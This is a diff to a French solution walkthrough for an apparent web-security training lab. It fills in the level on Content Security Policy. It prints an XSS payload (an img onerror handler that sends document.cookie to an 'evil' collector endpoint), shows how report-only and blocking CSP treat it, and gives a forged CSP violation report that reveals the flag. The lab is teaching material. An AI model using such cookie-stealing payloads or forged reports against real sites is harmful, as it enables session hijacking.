@@ -46,7 +46,7 @@ Une fonction `window.revealFlag()` n'existe qu'en mode vulnérable.
 1. Publier un message contenant un gestionnaire d'événement qui exfiltre le cookie
    du bot vers le collecteur de l'attaquant, par exemple :
    `<img src=x onerror="fetch('/api/evil/collect?c='+document.cookie)">`.
-2. Cliquer sur « Faire relire les messages par le bot ». Le bot relit le livre d'or
+2. Cliquer sur « Lancer la relecture du bot ». Le bot relit le livre d'or
    dans le navigateur du joueur : le serveur lui attribue une session `ba_admin`
    **non HttpOnly** (porteuse du flag), et le message est réinjecté en HTML brut
    (`innerHTML`) — le payload s'exécute dans sa session.
@@ -66,7 +66,31 @@ le serveur refuse tout HTML (400, validation Zod), la session du bot est `HttpOn
 
 ## Niveau 3 — CSP : « Le mur invisible » (étape 4)
 
-_À compléter._
+Le livre d'or du niveau 2 (mêmes messages, même bot, toujours vulnérable) est
+rejoué sous une CSP posée par un middleware Nitro sur la page du niveau.
+
+1. Garder (ou republier) le message piégé du niveau 2 :
+   `<img src=x onerror="fetch('/api/evil/collect?c='+document.cookie)">`.
+2. **CSP « Aucune »** : lancer la relecture du bot → le payload s'exécute, le
+   collecteur reçoit le cookie.
+3. **CSP « Rapport seul »** (`Content-Security-Policy-Report-Only`) : le payload
+   s'exécute toujours, mais la console CSP affiche « ⚠ signalée ·
+   script-src-attr ← inline » (rapport envoyé au `report-uri`).
+4. **CSP « Bloquante »** : le navigateur refuse le gestionnaire `onerror`
+   (`script-src 'self'`, sans `'unsafe-inline'`) : rien n'est exfiltré, la
+   console affiche « ⛔ bloquée » et **le flag apparaît** dans la console CSP.
+
+Chaque changement de CSP recharge la page : la politique vient de l'en-tête HTTP
+du document, elle ne change pas sans nouveau chargement.
+
+Raccourci (et leçon) : un rapport de violation se forge à la main, par exemple
+`POST /api/mur-invisible/csp-report?d=enforce` avec un corps
+`{"csp-report":{"effective-directive":"script-src-attr","blocked-uri":"inline"}}`.
+Les rapports CSP ne prouvent rien : on ne leur fait jamais confiance.
+
+**En mode sécurisé** : la CSP bloquante est imposée et le bot relit les messages
+comme du texte ; aucune violation, et le flag n'est jamais révélé (même avec un
+rapport forgé).
 
 ## Niveau 4 — CSRF : « Le virement fantôme » (étape 5)
 
